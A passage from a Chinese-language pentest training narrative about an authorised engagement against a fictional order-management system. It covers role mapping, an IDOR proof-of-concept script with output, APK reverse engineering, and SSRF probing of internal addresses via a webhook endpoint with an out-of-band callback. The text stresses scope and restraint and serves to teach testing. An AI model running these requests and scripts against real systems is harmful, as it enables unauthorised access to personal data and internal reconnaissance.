① 应然矩阵成形：23 端点 × 4 角色每个格子有"允许/拒绝/未知"三态标注（未知=待差分，正是后续测试用例来源）；② O-1 复核有正反证据：连续 5 次错密码触发验证码 + 15 分钟锁定（`evidence/O1-lock.png`）；③ sessions/ops01.json 保存 token、过期时间、刷新脚本，401 后 10 秒内可恢复；④ journal 记录 need_change_pwd=true——初始密码问题登记为 leads/L-04（弱初始口令策略，属管理类发现）。

### 2.5 【陷阱】

- **会话过期伪装成漏洞**：30 分钟后全接口 401，乍看像"鉴权不稳定"，其实是 access 过期——先查 sessions 过期检测，再谈漏洞假设。
- **v1/v2 并存**：UA 里带 "YunFanField/2.4.1" 时响应头出现 `X-API-Hint: v2`——多代 API 并存是常态，老代常缺鉴权（VOL-05 §1 金矿论断），此处先登记 H2-2，第四幕 APK 给出实锤。
- **把前端路由当权限**：路由表只是**应然**；"实然"要靠重放（第三、六幕的主题）。审计出身的人尤其容易把"页面不显示"误当"接口不可达"。

> 🧭 **导游词（现场感）**：401 潮水般涌来的那一刻，第一反应是"鉴权出问题了？"——等等，先看 sessions 里的过期时间。
> 你会在某个下午亲历一次：一个"疑似漏洞"在 30 分钟后自动变回"忘刷新 token"。会话问题伪装成漏洞，是认证后测试的日常。

### 2.6 【AI 位】

AI 能做：① 从 8MB 压缩 JS 里提取 path/roles 对生成应然矩阵草表（提示思路：*"这是前端路由压缩代码，提取 path 与 meta.roles 的配对，输出 markdown 表；只处理给出的文本，不要推测未出现的角色"*）；② 生成 endpoints.jsonl 骨架并标注"来源=代码/来源=观测"；③ 起草 O-1/O-2/O-3 复核结论段落。人必须守住：矩阵里每个"允许"判定都要能指回一条观测证据（Burp 条目号或代码行），AI 补全的格子一律标"未知"而不是"允许"；复核结论签字前逐条与原始报文比对（VOL-09C 反证门）。

### 2.7 幕末目录树快照 v2

```text
2026-09-07-yunfan-oms/
├── journal.jsonl             # 11 行
├── assets/
│   ├── assets.jsonl          # +endpoints×23、role×4、session×1
│   ├── attack_surface.json
│   ├── endpoints.jsonl       # 上文节选
│   └── role_model.md         # 应然矩阵（23×4，含"未知"格）
├── leads/
│   ├── old-report-items.jsonl  # O-1 已修复 / O-2 部分属实 / O-3 已修复
│   ├── L-03-out-of-scope-api.md
│   └── L-04-initial-password-policy.md
├── coverage/coverage.json    # +认证流/旧报告复核/端点枚举行
├── evidence/                 # O1-lock.png、登录流 HAR
├── sessions/ops01.json       # token+过期+刷新脚本
└── findings.jsonl            # 0 行（O-2 部分属实先挂 leads，等客户澄清再升级）
```

> **上帝视角旁白**：O-2 的真相是：30 分钟 access + 8 小时 refresh 且 refresh 只有过期一种失效方式——旧报告说"会话 8 小时不失效"在**效果上**仍成立（拿了 refresh 就能一直续）。我们此刻判"部分属实"偏保守，终幕复盘时会看到：这条最终以"风险接受"结案，而它的证据在第二幕就已齐了——**保守判定+证据在手，比激进判定+事后返工便宜**。

---

## 第三幕 发现一：相邻账号 IDOR——订单水平越权（D4–D5）

D4 晚，地图成形，该开门试锁了。应然矩阵里 /api/v1/orders/{order_id} 那一排 ✓ 藏着一个没人回答过的问题：接口放 operator 进来，但有没有校验"这单是不是你的"？第二幕的 JWT 给了否定的暗示，现在是把暗示变成证据的时刻。整幕的悬念压缩在一次差分里：把 1042 改成 1043，服务器会怎么回答。

**【状态面板】D5 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | `GET /api/v1/orders/1042`（本人单）返回 200 全量详情；**改 id 为 1043/1044/1045（同部门他人单）同样 200**，响应含他人姓名、手机号、收货地址、订单金额；id≥9000 区间返回 403；未登录 401；JWT 无归属字段（第二幕已证） |
| 当前假设 | H3-1「order_id 数字自增、无归属校验」（**Certain**，差分已闭环）→ 升级为 finding F-01；H3-2「同模式可能蔓延到 /refunds、/customers」（Firm，第七幕后留给复测建议） |
| 预算消耗 | 31 / 80 人时 |
| 覆盖台账增量 | 已测：订单详情接口对象级鉴权（正/反/未登录三对照，采样 3）。明确不测：批量遍历（r3 证据最小化，只证明存在与影响面级别，不统计总量）；/customers 等同类接口（登记为"同类面待测"，预算原因排后——覆盖台账的诚实空洞） |

### 3.1 【因果】为什么下一个动作是"改一个数字"

第二幕的应然矩阵里，`/api/v1/orders/{order_id}` 有一排"未知"格：接口允许 operator+ 访问，但**没有一条证据**表明服务端校验了"这单是不是你的"。JWT 无归属字段又消除了最后一种"服务端可能在别处绑定"的辩护。信息缺口收敛为一个可实验问题：**换 id 会怎样**——这是全交战信息增益密度最高的一个请求（一个字节的变化区分"对象级鉴权有无"）。同时它是非破坏的（GET、只读、采样 3 条），完美契合 r2/r3。所以 IDOR 排在一切主动测试之前。

### 3.2 【原理】水平越权的三个技术根因与判定信号

水平越权（IDOR）在服务端代码里几乎只有三种形态：① 查询只按主键、缺归属过滤（`SELECT * FROM orders WHERE id=?`，没有 `AND creator_uid=?`）；② 归属过滤存在但可被参数覆盖（uid 从请求参数取而不是会话取）；③ 权限检查在**渲染层**（返回了数据，前端按角色隐藏字段）。黑盒下三者的判定信号不同：①是跨用户 200 全量；②是加参数后 200；③是响应里有隐藏字段（抓包可见、页面不可见）。本例是①，信号最强：**响应包含归属字段（creator_name ≠ 当前用户）且状态码 200**。

判定还要两翼齐备：**反证**（id≥9000 管理类单据 403——说明存在某种更粗的区间/类型校验，垂直边界没破，漏洞边界反而清晰）与**基线**（本人单 200、未登录 401——排除"接口裸奔"的更强解释，精确锚定缺陷=对象级归属校验缺失）。这就是 B′ 契约里 counterevidence 字段的意义：**写得出边界，才算真的理解了这个洞**（VOL-09C 反证门）。

### 3.3 【操作】

Burp Repeater（改一个字符，其余不动）：

> 🧭 **导游词（现场感）**：改完那个字符、拇指悬在 Send 上的半秒，是整幕最安静的时刻——
> 第 0 幕的 r3、第二幕的暗示、五天的铺垫，全押在下一条响应上。

```http
GET /api/v1/orders/1043 HTTP/1.1
Host: oms.yunfan.example
Authorization: Bearer {{SESSION:ops01}}
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":0,"data":{"order_id":1043,"creator_name":"李四（华东二组）","creator_uid":81,
 "buyer_phone":"13900000321","buyer_address":"江苏省苏州市**区**路 12 号",
 "amount_fen":459900,"status":"PAID","items":[{"sku":"YF-TV-55","qty":1}]}}
```

采样脚本（非破坏、限速自适应、证据落盘时脱敏）：

> 🧭 **导游词（观察）**：200 只是入场券，钥匙在响应第三行：`creator_uid: 81`——而你的 token 里写着 77。
> 这两个数字的差就是"水平越权"的全部证据；后面的采样都只是在给这一行找旁证。

```python
#!/usr/bin/env python3
# poc/f01_idor_sample.py —— 只读采样；采样规模=3（scope r3 证据最小化）
import json, sys, time, requests
BASE, TOKEN = "https://oms.yunfan.example", sys.argv[1]   # token 来自 sessions/ops01.json
H = {"Authorization": f"Bearer {TOKEN}"}
for oid in (1042, 1043, 1044, 1045):                      # 1042=本人单（基线）
    r = requests.get(f"{BASE}/api/v1/orders/{oid}", headers=H, timeout=10)
    d = (r.json() or {}).get("data", {})
    p = d.get("buyer_phone", "") or ""
    print(json.dumps({"id": oid, "status": r.status_code,
        "creator": d.get("creator_name"), "creator_uid": d.get("creator_uid"),
        "phone_masked": (p[:3] + "****" + p[-4:]) if p else None}, ensure_ascii=False))
    time.sleep(21)                                        # 网关限速 60/min/token，留足余量
```

```text
$ python3 poc/f01_idor_sample.py $(jq -r .access_token sessions/ops01.json) | tee evidence/F01-sample.txt
{"id": 1042, "status": 200, "creator": "ops_user01（本人）", "creator_uid": 77, "phone_masked": "138****2211"}
{"id": 1043, "status": 200, "creator": "李四（华东二组）", "creator_uid": 81, "phone_masked": "139****0321"}
{"id": 1044, "status": 200, "creator": "王五（华南一组）", "creator_uid": 88, "phone_masked": "137****8876"}
{"id": 1045, "status": 404, "creator": null, "creator_uid": null, "phone_masked": null}
```

findings.jsonl 第一条（B′ 契约字段齐备）：

> 🧭 **导游词（节奏）**：三行 200 摆在一起，最危险的念头是"拉一百条看看规模？"——停。
> r3 的采样上限不是官僚要求：规模是客户用日志自己盘点的事；你多拉一条，性质就从"证明"滑向"泄露"。

```jsonl
{"id":"F-01","title":"订单详情接口水平越权（IDOR）：任意 operator 可读取他人订单全量信息",
 "target":"oms.yunfan.example","endpoint":"GET /api/v1/orders/{order_id}",
 "dedup_key":"oms|GET|/api/v1/orders/{order_id}|missing-object-ownership",
 "rule_id":"WSTG-ATHZ-04","cvss":"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N","cvss_score":6.5,
 "business_impact":"个人订单含姓名/手机号/收货地址/金额，构成个人信息泄露；同类接口若蔓延（H3-2）影响面 ×N",
 "exploitation_status":"validated","confidence":"Certain",
 "auth_context":"operator(ops_user01/uid=77) → 他人订单(uid=81/88)",
 "scope_check":"in-scope: oms.yunfan.example；采样 3 条、PII 落盘前脱敏（r3 合规）",
 "counterevidence":"id≥9000 管理类单据返回 403（垂直边界未破）；本人单 200、未登录 401（排除接口裸奔与鉴权失效两种更强解释）",
 "evidence":["evidence/F01-1043-req.txt","evidence/F01-1043-resp.txt","evidence/F01-sample.txt"],
 "poc_ref":"poc/F-01.yaml","remediation":"服务端查询强制叠加归属过滤（AND creator_uid=:session.uid）；响应字段最小化；增加跨账号访问的审计告警","discovered_at":"2026-09-10T10:41:00+08:00"}
```

响应字段影响面评估（报告"影响评估"小节的形态）：

| 字段 | 示例（脱敏） | 信息类别 | 影响定性 |
|---|---|---|---|
| creator_name / creator_uid | 李四（华东二组）/ 81 | 内部人事信息 | 组织结构泄露 |
| buyer_phone | 139****0321 | 个人信息（通信手段） | 个人信息主体权益影响 |
| buyer_address | 苏州市**区**路 12 号 | 个人信息（行踪轨迹相关） | 高敏 |
| amount_fen / items | 459900 / YF-TV-55×1 | 交易信息 | 商业敏感 |

### 3.4 【验证】

成功判据四条全部满足：① 跨用户请求 200 且响应含 `creator_uid ≠ 77`；② 基线（1042 本人 200）与反证（404/403 分层存在）齐备；③ 重放稳定：间隔 20 分钟三次结果一致；④ 证据链可回放——任何人拿 `poc/F-01.yaml`（第七幕）盲发可复现。任何一条不满足则降级 Tentative 进 leads/。

### 3.5 【陷阱】

- **限速的反噬**：Intruder 一把 200 发出去，第 14 发就 429，IP 被云 WAF 标记 10 分钟——采样脚本必须自带节流，且 429 要区分"限速"与"鉴权失败"（看响应体 `code` 字段，本平台 4291=限速、1001=未登录）。
- **把"能看到"变成"拖下来"**：证明影响面只需要 3 条带归属字段的记录。批量遍历既违反 r3，也会把"漏洞证明"变成"数据事故"——一人红队的自我纪律没有第二道防线。
- **区间误判**：1045 返回 404 不是"洞没了"，是该 id 不存在；403/404/200 三种响应分别对应类型拦截/不存在/成功，采样结论要按三态分别记录。

### 3.6 【AI 位】

AI 能做：① 写采样与脱敏脚本（上文即 AI 草稿、人工改定）；② 从响应样本生成字段级影响分析表（哪些字段构成 PII、对应个保法哪类信息）；③ 起草 finding 文案与 WSTG 映射。人必须守住：**采样规模、目标区间、是否落盘原始 PII**这三件事永远人批；AI 生成的脚本先在本地 mock 服务上跑通再上目标（VOL-09A 的"影子验证"纪律）；影响分析里的法条引用逐条核对原文，AI 编造条文是高频事故。

### 3.7 幕末目录树快照 v3

```text
2026-09-07-yunfan-oms/
├── journal.jsonl             # 17 行（F-01 verified 闭环：hypothesis→testing→verified）
├── hypotheses.jsonl          # H3-1 verified；H3-2 pending（同类面蔓延，留复测）
├── assets/                   # +fact：id 区间语义（<9000 业务单/≥9000 管理单）
├── findings.jsonl            # 1 行（F-01，上文完整）
├── poc/f01_idor_sample.py
├── evidence/
│   ├── F01-1043-req.txt / F01-1043-resp.txt   # Burp 原始报文（响应已脱敏+脱敏说明）
│   └── F01-sample.txt
└── coverage/coverage.json    # +orders 详情接口：reported；/customers、/refunds 同类面：needs_follow_up
```

> **上帝视角旁白**：真实系统里 /api/v1/customers/{uid} 有**同一个洞**（连代码都是同一个 DAO 方法复制的），而我们直到交卷都没测它——不是忘了，是预算给了审批流（价值更高的资金面）。它被诚实地留在 coverage 的 needs_follow_up 里，成为复购工作说明书的一部分。**没测到不是罪，没记录才是。**

---

## 第四幕 APK 逆向：未公开 API 端点浮出（D6–D7）

D6，Web 正面的低垂果实已经摘完，战线转向你最熟悉的领域——客户端代码。field-app 是门店外勤 APP（巡店、补货、价签上报——零售生态里最典型的"发给店员的东西"），也是本场交战唯一一份"甲方亲手发出的源码级材料"，审计手感终于全面解禁。注意本幕的定位：不是攻破 APP，而是测绘它在悄悄使用、而 Web 界面上从不出现的那一层接口。第二幕的悬念 H2-2（v2 存在吗）在这里见分晓。

**【状态面板】D7 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | `field-app.apk` v2.4.1，包名 `com.yunfan.fieldapp`，未加固、未混淆字符串区；BASE=`https://oms.yunfan.example/api/v2/`——**v2 接口与 Web 同域（in-scope）**；v2 端点 3 个：`orders/sync`、`webhook/register`、`webhook/test`；BuildConfig 含 `API_BASE_INTERNAL="http://10.10.20.31:8080"`（debug 字段）；代码内含测试用 AccessKey `AK-TEST-7721`（**只登记不利用**）；实测：ops_user01 调 `orders/sync` → 403（需 field 角色）；调 `webhook/test` → **200** |
| 当前假设 | H4-1「`webhook/test` 由服务端发起对 url 的请求 → SSRF 候选」（Firm，代码里可见 OkHttpClient 直连）；H4-2「`orders/sync` 的角色校验在 v2 层独立实现，可能存在 v1/v2 鉴权差」（Tentative） |
| 预算消耗 | 43 / 80 人时 |
| 覆盖台账增量 | 已测：APK 静态流水线（验签/反编译/字符串分桶/网络类精读）、v2 端点存活与角色差异实测。明确不测：真机动态运行与抓包（证书固定绕过耗时且静态已够，决策见 4.5）；硬编码 AK 的有效性验证（r5 红线：不使用泄漏凭据）；`10.10.20.31` 直接访问（scope r1：仅可达性，且只能经第五幕服务端侧信道） |

### 4.1 【因果】为什么黑盒交战要拆客户发的 APK

三个独立信息缺口在此汇合：① 第二幕的 H2-2（v2 接口存在暗示）缺实锤；② 第一幕的 H1-3（后端段不可直达）需要一条**服务端侧信道**才能继续；③ VOL-05 的核心论断——客户端是甲方"必须发到用户手里"的代码，服务端地址、兼容接口、硬编码凭据、更新机制四类情报只有这里有。APK 是唯一被授权的"甲方代码"，对源码审计出身的你，这是**主场作战**：没有源码的代码审计，你的全部经验可迁移。顺序上放在 IDOR 之后，是因为它的产出（未公开端点）恰好喂养下一幕（SSRF），而 SSRF 又是兑现"后端段可达性验证"的唯一合规路径——环环相扣。

### 4.2 【原理】为什么移动端 API 面常比 Web 宽

网关路由按前缀分流：`/api/v1` 给 Web 控制台、`/api/v2` 给 APP。两代接口由不同团队在不同时期实现，鉴权中间件各自挂载——**"同域不同鉴权域"**是常态。Web 控制台的运维知道 v1 要登录，却常忘了网关上还躺着 v2；而 v2 里为外勤设备设计的功能（webhook 健康探测、数据同步）天然带"服务端主动外连"能力，正是 SSRF 高发区。逆向 APK 的价值不是"破解 APP"，而是**测绘这块被遗忘的攻击面**，再用现有合法身份（ops_user01）对它做差分。

### 4.3 【操作】（流水线对齐 VOL-05 §3）

```bash
# ① 验签与基本信息（先确认包完整、版本，再谈内容）
$ apksigner verify --print-certs recon/field-app.apk | head -3
Signer #1 certificate DN: CN=YunFan Field App, O=YunFan Technology (fictional)
$ unzip -p recon/field-app.apk AndroidManifest.xml > /dev/null && echo "manifest ok"
# ② 反编译（jadx，只导 java；apktool 解资源）
$ jadx -d recon/apk-src recon/field-app.apk --no-res 2>&1 | tail -1
INFO - done
# ③ 字符串分桶 grep（VOL-05 §2.4 战术）
$ grep -rhoE 'https?://[a-zA-Z0-9./_-]+' recon/apk-src | sort -u | tee recon/apk-urls.txt
https://oms.yunfan.example/api/v2/          # ← 正式环境
http://10.10.20.31:8080                     # ← debug 内部地址（BuildConfig）
https://push.some3rd.example/…              # ← 第三方推送（越界，只登记）
```

> 🧭 **导游词（观察）**：三行 URL 三种命运：同域 `/api/v2/` 是入场券，`10.10.20.31:8080` 是第五幕的钥匙，`push.some3rd` 是必须绕开的雷。
> 一次 `sort -u` 的输出，把后面五天的路线图排完了。

```bash
# ④ 端点与网络类精读
$ grep -rn "api/v2|@POST|@GET" recon/apk-src/sources/com/yunfan/field/api/ | head -6
ApiClient.java:  BASE = BuildConfig.API_BASE;                       // https://oms.yunfan.example/api/v2/
RemoteOpsService.java:  @POST("field/orders/sync")                  // 需 field 角色（token role 校验）
RemoteOpsService.java:  @POST("field/webhook/register")             // body: {name, url}
RemoteOpsService.java:  @POST("field/webhook/test")                 // body: {webhook_id | url}
$ sed -n '40,66p' recon/apk-src/sources/com/yunfan/field/ops/WebhookApi.java   # 看服务端语义
// 服务端对 url 发起 OkHttpClient 请求，超时 5s，返回 {reachable, status, latency_ms}
# ⑤ 实测差分（合法身份，Burp Repeater）
POST /api/v2/field/orders/sync     + ops_user01 token → 403 {"code":3001,"msg":"field role required"}
POST /api/v2/field/webhook/test    + ops_user01 token → 200 {"code":0,"data":{"reachable":false,"url":""}}   # 空 url，接口活着！
```

journal 关键行：

> 🧭 **导游词（现场感）**：403 和 200 挂在同一个 token 下面——那一刻 H4-1 从"值得看"升级为"必须立刻验证"。
> 两个响应的差不是运气：sync 校验角色，test 只校验登录。裂缝正开在这条缝上。

```jsonl
{"ts":"2026-09-11T16:05:00+08:00","act":"A4","step":"apk-static","status":"done","budget_min":300,"summary":"v2 端点×3 实锤（H2-2→Certain）；webhook/test 对 ops 角色开放→SSRF 候选 H4-1 Firm；AK-TEST-7721 只登记不利用（L-01）"}
```

### 4.4 【验证】

① apk-urls.txt 每个地址都过了 scope_check：同域 v2 保留、内网 IP 登记、第三方域名进 L-03 增补；② v2 端点存活有正反对照（sync 403 / test 200——同一身份同一前缀，差异来自角色校验粒度，这本身就是 H4-2 的证据）；③ WebhookApi.java 的服务端语义有代码行号支撑（40–66 行），不是猜测；④ L-01（硬编码 AK）条目包含"未验证有效性"的显式声明——不验证也是决策，要留痕。

### 4.5 【陷阱】

- **动态执念**：本幕真实踩坑——为"完整起见"想给 APK 挂代理抓包，卡在证书固定（okhttp CertificatePinner）上耗了 1.5 小时。事后复盘：静态代码已给出全部所需语义，动态纯属仪式感。**目的决定手段**（VOL-07-08 A2），这是终幕"走错三步"之二。
- **debug 字段的诱惑**：`10.10.20.31:8080` 就躺在 BuildConfig 里，直接访问它一行 curl 的事——但 scope r1 只允许"可达性验证"且只能经授权路径。纪律的正确执行方式是把它登记为资产，等第五幕用**服务端侧信道**合规地验证它。
- **把 API_BASE_INTERNAL 当现行配置**：debug 字段可能指向早已下线的环境。证据等级要标"客户端静态信息"，服务端可达性另证。

> 🧭 **导游词（节奏）**：`AK-TEST-7721` 就躺在代码里，一条请求就能验真伪——这是全卷最痒的一次"就在手边"。
> 别碰。r5 写得明白：泄漏凭据只上报、不使用。它进 L-01 的那一刻，就是它在本次交战的终点。

### 4.6 【AI 位】

AI 能做：① 对 jadx 导出的 3000+ Java 文件做端点/URL/密钥模式分桶（提示思路：*"在以下反编译输出中提取：全部 URL 常量、全部 Retrofit 注解端点、全部形似 AK/SK/token 的硬编码字符串；每条给 文件:行号；不要总结代码逻辑"*）；② 从 WebhookApi 代码归纳服务端行为模型（发起方、超时、返回字段）；③ 生成 L-01 硬编码凭据 finding 卡草稿（VOL-05 §5 格式）。人必须守住：**密钥只上报不利用**（r5）——AI 不得收到"验证此 AK 有效性"的任何指令；分桶结果抽查 10% 核对 文件:行号 真实存在（AI 幻觉文件路径是已知事故形态，VOL-09C 独立重放门的推论：凡不能回放的不进 findings）。

### 4.7 幕末目录树快照 v4

```text
2026-09-07-yunfan-oms/
├── journal.jsonl             # 24 行
├── assets/
│   ├── assets.jsonl          # +endpoint×3(v2)、host:10.10.20.31、cred-lead:AK-TEST-7721
│   └── apk-intel.json        # 包名/版本/签名/API bases/证书固定开关
├── hypotheses.jsonl          # H2-2 Certain；H4-1 Firm→待第五幕实验；H4-2 Tentative
├── leads/
│   ├── L-01-hardcoded-ak.md  # AK-TEST-7721，Manual Review Required（交客户确认归属）
│   └── L-03-out-of-scope-api.md   # +push.some3rd.example
├── recon/apk-src/  recon/apk-urls.txt
├── coverage/coverage.json    # +APK 静态流水线：reported；动态分析：ruled_out（理由=静态充分+成本）
└── findings.jsonl            # 1 行（F-01）
```

> **上帝视角旁白**：`orders/sync` 其实还有个隐藏缺陷——分页参数无上限，一次能拉全量订单。但它对 field 角色才是问题，而我们没有 field 账号，整场交战这个洞都不成立（攻击前提不闭合）。第四幕的正确结论不是"sync 有洞"，而是"sync 对我们的身份关着门"——**前提条件不满足的洞，连 leads 都不该进**，进 coverage 的 ruled_out 才对。

---

## 第五幕 发现二：未公开端点 SSRF——内网边缘的克制探测（D8）

D8，两条线索在今天汇合：第四幕递来的 webhook 接口，和第一幕欠下的"后端段可达性"。你只做两件事——证明服务端会替你发请求，然后极其克制地借它的眼睛看一眼 10.10.20.0/24。本幕的悬念不在"能不能"，而在"忍不忍得住"：全天服务端外连总数，不会超过五次。

**【状态面板】D8 18:00**

| 项 | 内容 |
|---|---|
| 已知事实（assets） | `POST /api/v2/field/webhook/register`（body 含 url）与 `webhook/test` 均对 operator 开放；服务端以 5s 超时主动请求 url，返回 `{reachable,status,latency_ms,body_head}`；经该接口：10.10.20.1 → reachable（HTTP 401）；**10.10.20.31:8080 → reachable（HTTP 200，body_head 显示 yf-taskcenter）**，与第四幕 APK 情报交叉验证成立；10.10.20.254 → reachable（HTTP 403）；负对照 10.10.20.200 → connect timeout；出网验证：对自有回连域 oob.lab.example（虚构）收到一次 GET |
| 当前假设 | H1-3「后端段从服务端可达」→ **Certain**（侧信道闭环）；H5-1「SSRF 可读取内网服务响应片段（body_head）→ 信息泄露面成立」（Certain）→ F-02；H5-2「302 跳转/DNS 变体可能绕过未来的地址黑名单」（Tentative，**本幕不展开**，留给修复建议与复测） |
| 预算消耗 | 53 / 80 人时 |
| 覆盖台账增量 | 已测：v2 webhook 双端点 SSRF 验证（出网 + 内网 3 地址 + 负对照，共 5 次服务端请求）。明确不测：全段 254 地址遍历（r1 允许的是"验证可达性"而非测绘，3 个代表地址已满足授权意图）；端口扫描（同上）；云元数据 169.254.169.254（scope r4 明确排除）；内网服务漏洞探测与利用（r1 禁止深入） |

### 5.1 【因果】为什么这是全交战最"少"的一幕——而且必须少

两个缺口在本幕闭合：H4-1（webhook 是否服务端外连）只需一次受控实验；H1-3（后端段可达性）从第一幕起就欠着一个合规验证路径。但本幕的真正主题是**边界纪律**：scope 写着"仅验证可达性，禁止深入"，翻译成动作就是——目标地址**枚举封闭**（3 个代表地址 + 1 个负对照，来源各自有据：网关惯例地址、APK 情报地址、段末惯例地址）、**每个地址一次请求**、拿到 reachable 与指纹即停。克制不是胆小：授权文本的解释权在客户，"3 个地址证明段内可达"与"254 个地址遍历"在客户眼里是两种完全不同的行为。少即是合规。

### 5.2 【原理】SSRF 与"响应即侧信道"

SSRF 的本质是**让服务端替你发起它本来不会为你发起的请求**——攻击者的网络位置借用了应用的信任位置。Webhook 健康探测是最"正当"的 SSRF 载体：业务上它就该由服务端外连，缺陷只在于**url 参数未做地址族/目标白名单约束**。判定信号用三个字段就够：`reachable`（TCP 层结论）、`status`（HTTP 层结论）、`body_head`（应用层指纹）。负对照（确定不存在的地址超时）与正对照（出网到自有监听域收到回连）把"服务端真的在发请求"钉死为实验事实，而非接口文档的自述。

还要说清**不深入**的技术含义：拿到 `10.10.20.31:8080` 的 200 与 `yf-taskcenter` 指纹后，对其做路径枚举、参数 fuzz、漏洞探测都越过了 r1。内网边缘的正确产出是**攻击面情报**（它活、它是什么、谁能摸到），不是内网战果——后者属于另一份授权（真到那一步，就是 VOL-03 的故事了）。

### 5.3 【操作】

先报备后探测（journal 先行）：`{"ts":"…T09:12+08:00","summary":"拟经 webhook/test 探测 4 个地址（3 正 1 负），已邮件周工报备，预计服务端外连 5 次"}`。

> 🧭 **导游词（节奏）**：报备邮件发出之后，探测清单就冻结了——5 个地址，一个都不许现场"顺手加"。
> 克制类动作出事，几乎都出在"临时多试一个"的那一下。

```http
POST /api/v2/field/webhook/test HTTP/1.1
Host: oms.yunfan.example
Authorization: Bearer {{SESSION:ops01}}
Content-Type: application/json

{"url":"http://10.10.20.31:8080/"}
```
```http
HTTP/1.1 200 OK

{"code":0,"data":{"reachable":true,"status":200,"latency_ms":11,
 "body_head":"{\"service\":\"yf-taskcenter\",\"ver\":\"1.7.2\"}"}}
```

探测矩阵（每次间隔 ≥30s，结果落 `evidence/F02-probe-matrix.tsv`）：

| url | reachable | status | latency_ms | body_head | 结论 |
|---|---|---|---|---|---|
| `http://oob.lab.example/ping` | true | 200 | 141 | — | 正对照：回连监听收到 GET |
| `http://10.10.20.1/` | true | 401 | 8 | （空） | 网关类服务，要求认证 |
| `http://10.10.20.31:8080/` | true | 200 | 11 | `yf-taskcenter 1.7.2` | 与 APK 情报交叉验证 |
| `http://10.10.20.254/` | true | 403 | 9 | （空） | 存活，策略拒绝 |
| `http://10.10.20.200/` | false | — | 5000 | `connect timeout` | 负对照：不可达 |

内网边缘产出物规范（进入报告"攻击链叙事"章的形态——只给结论与指纹，不给能力暗示）：

> 🧭 **导游词（观察）**：矩阵里证据等级最高的一格是 `.31` 的 `yf-taskcenter`——它与第四幕 BuildConfig 里的地址是两个独立来源指向同一台机器。
> 单源是线索，双源是事实；报告里这一行的底气和别的行不一样。

| 产出 | 形态 | 边界 |
|---|---|---|
| 可达性矩阵 | 地址 × {reachable, status, latency} | 仅授权清单内地址 |
| 服务指纹 | body_head 片段（≤64 字节） | 出现凭据/会话类字段即停 |
| 拓扑推断 | "服务端可路由至 10.10.20.0/24" | 不绘制完整内网地图 |

findings.jsonl 第二条：

```jsonl
{"id":"F-02","title":"未公开移动端接口 SSRF：webhook 探测接口可对任意地址发起服务端请求并回显指纹",
 "target":"oms.yunfan.example","endpoint":"POST /api/v2/field/webhook/{test,register}",
 "dedup_key":"oms|POST|/api/v2/field/webhook/*|unrestricted-url-fetch",
 "rule_id":"WSTG-INPV-19","cvss":"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N","cvss_score":4.6,
 "business_impact":"内网架构泄露（服务指纹/存活状态）；若被真实攻击者利用可作为内网跳板进一步攻击（本交战未深入，r1）",
 "exploitation_status":"validated","confidence":"Certain",
 "auth_context":"operator(ops_user01) → 服务端网络位置 → 10.10.20.0/24",
 "scope_check":"in-scope: oms.yunfan.example；探测目标 4 个、服务端外连 5 次、已报备；未触碰云元数据（r4）",
 "counterevidence":"10.10.20.200 超时（接口不是无差别'全通'，结论限定在真实存活主机）；body_head 截断在 64 字节，泄露为片段级而非全文",
 "evidence":["evidence/F02-req-01.txt","evidence/F02-probe-matrix.tsv","evidence/F02-oob-catch.png"],
 "poc_ref":"poc/F-02.yaml","remediation":"url 目标白名单（域名解析后校验地址族，拒绝私网/链路本地/元数据段）；禁跟随重定向；响应不回显 body_head；webhook 功能迁移至独立低权服务","discovered_at":"2026-09-14T14:03:00+08:00"}
```

### 5.4 【验证】

① 正负对照齐备：出网回连证明"服务端确实发请求"，200 超时证明"结论有区分度"；② 交叉验证：.31:8080 的指纹与 APK BuildConfig 独立来源互证（两源证据 > 单源）；③ 重放稳定：10.10.20.1 二次请求结果一致（401/8ms）；④ 探测总量与报备一致：服务端外连恰 5 次，journal 与客户侧告警对得上账。

### 5.5 【陷阱】

- **顺手摸元数据**：169.254.169.254 是 SSRF 测试的"条件反射"，但 scope r4 明确排除——反射弧必须让位于授权文本。同类被抑制的条件反射还有：对 .31 做目录 fuzz、拿 body_head 里的版本号查 CVE 打 payload。
- **把 reachable 当结论全部**：401/403 与 200 的信息量不同（认证墙 vs 策略墙 vs 敞开），指纹表要按 status 分层表述，报告里才不会夸大。
- **出网地址选择**：验证出网要用**自有**监听域，不能拿公网任意站当探针（打第三方=第三次越界）。自有域与用途提前写进 journal。

> 🧭 **导游词（现场感）**：`.254` 回了个 403，指纹是空的——"要不要敲两个常见路径确认它是什么？"这个念头冒出来时，把 r1 再读一遍。
> 见到门就想敲是侦察的本能；停在门前，是授权测试的本能。

### 5.6 【AI 位】

AI 能做：① 把 5 条探测结果整理成分层指纹表并起草影响描述；② 生成修复建议初稿（白名单/DNS 预解析/禁重定向的取舍说明，提示思路：*"给出 SSRF 防御三层方案（输入白名单/解析后校验/出网代理），按改造成本排序，标注每层挡住本 POC 的哪一步"*）；③ H5-2（重定向/DNS 变体）写成给客户的"修复验收用例清单"——变体当测试用例交给客户，而不是自己打。人必须守住：**探测目标清单逐条 scope_check + 每次执行前人工确认**（本幕每个 url 都是人在终端逐个敲的，没有循环）；body_head 里若出现敏感数据立即停并按 r5 处理。

### 5.7 幕末目录树快照 v5

```text
2026-09-07-yunfan-oms/
├── journal.jsonl             # 31 行（含 5 次外连的逐条记录与报备指针）
├── assets/assets.jsonl       # +fact：10.10.20.0/24 服务端侧可达（3/4 地址）；host 指纹×3
├── hypotheses.jsonl          # H1-3 Certain；H4-1 Certain；H5-2 Tentative（转修复验收清单）
├── findings.jsonl            # 2 行（F-01、F-02）
├── evidence/
│   ├── F02-req-01.txt / F02-probe-matrix.tsv
│   └── F02-oob-catch.png     # 自有监听域收到的 GET 记录
└── coverage/coverage.json    # +后端段可达性：reported（经侧信道）；内网深入：ruled_out（r1）
```

> **上帝视角旁白**：那台 403 的 10.10.20.254 上跑着一个未鉴权的任务提交面板——如果深挖，这场交战会变成另一个故事。但"仅验证可达性"五个字把我们停在了指纹这一层。**客户买的是边界内的确定性，不是攻击者的表演欲。** 复测时（第九幕）我们会知道这台机器后来怎么样了。

---

## 第六幕 发现三：审批流逻辑漏洞——金额篡改与顺序绕过（D9–D10 上午）

